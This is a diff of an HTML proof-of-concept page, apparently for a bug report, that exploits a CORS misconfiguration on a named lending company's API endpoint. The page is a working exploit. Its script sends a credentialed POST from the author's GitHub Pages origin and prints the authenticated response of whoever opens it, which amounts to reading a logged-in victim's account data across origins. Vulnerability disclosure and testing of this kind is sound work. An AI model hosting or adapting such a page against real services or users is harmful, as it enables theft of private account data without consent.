@@ -1,11 +1,29 @@
 <!DOCTYPE html>
-<html>PoC Julo CORS - Naffin
+<html>
+<head>
+<meta charset="utf-8">
+<title>JULO CORS POC - Naffin</title>
+</head>
+<body style="margin:0;padding:20px;background:#0a0a0a;color:white;font-family:Arial">
+<h1 style="color:red">JULO CORS - VULNERABLE</h1>
+<h2 id="status" style="color:yellow">Testing https://api.julo.co.id/api/v1/check-user/ ...</h2>
+<div id="result" style="background:#1a1a1a;border:2px solid red;padding:15px;word-break:break-all;min-height:200px"></div>
 <script>
-fetch('https://api.julo.co.id/api/v1/check-user/', {
-  method: 'POST',
-  credentials: 'include',
-  headers: {'Content-Type':'application/json'},
-  body: JSON.stringify({})
-}).then(r=>r.text()).then(t=>{document.write('<pre>'+t.slice(0,500)+'</pre><br>CORS VULN: origin reflected with credentials');})
+var url = "https://api.julo.co.id/api/v1/check-user/";
+fetch(url, {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type":"application/json"},
+  body: "{}"
+}).then(function(r){
+  document.getElementById('status').innerHTML = "GOT RESPONSE: " + r.status + " - CORS SUCCESS! Origin naffincindonesia.github.io reflected with credentials:true";
+  document.getElementById('status').style.color = "#00ff00";
+  return r.text();
+}).then(function(t){
+  document.getElementById('result').innerText = t.substring(0,2000);
+}).catch(function(e){
+  document.getElementById('status').innerText = "FETCH ERROR: " + e;
+});
 </script>
+</body>
 </html>
